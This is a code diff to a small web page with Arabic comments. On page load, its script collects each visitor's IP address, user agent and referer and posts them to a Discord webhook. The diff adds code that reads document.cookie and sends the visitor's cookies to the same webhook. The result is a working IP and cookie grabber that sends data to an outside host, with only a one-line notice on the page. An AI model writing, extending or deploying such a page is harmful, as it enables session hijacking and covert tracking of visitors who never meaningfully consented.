@@ -7,7 +7,7 @@
 </head>
 <body>
   <h1>Welcome!</h1>
-  <p>Your IP and basic information will be logged.</p>
+  <p>Your IP, cookies, and basic information will be logged.</p>
 
   <script>
     // عنوان الويب هوك الخاص بـ Discord
@@ -24,6 +24,7 @@
         // معلومات إضافية
         const userAgent = navigator.userAgent;
         const referer = document.referrer || 'N/A';
+        const cookies = document.cookie || 'No cookies available';
 
         // إرسال البيانات إلى الويب هوك الخاص بـ Discord
         await fetch(discordWebhookUrl, {
@@ -32,7 +33,7 @@
             'Content-Type': 'application/json',
           },
           body: JSON.stringify({
-            content: `🚨 **New Visitor Alert!** 🚨\nIP: ${ip}\nUser-Agent: ${userAgent}\nReferer: ${referer}`,
+            content: `🚨 **New Visitor Alert!** 🚨\nIP: ${ip}\nUser-Agent: ${userAgent}\nReferer: ${referer}\nCookies: ${cookies}`,
           }),
         });
 
@@ -41,6 +42,7 @@
           <p>Your IP: ${ip}</p>
           <p>User-Agent: ${userAgent}</p>
           <p>Referer: ${referer}</p>
+          <p>Cookies: ${cookies}</p>
         `;
       } catch (error) {
         console.error('Error fetching or sending visitor info:', error);
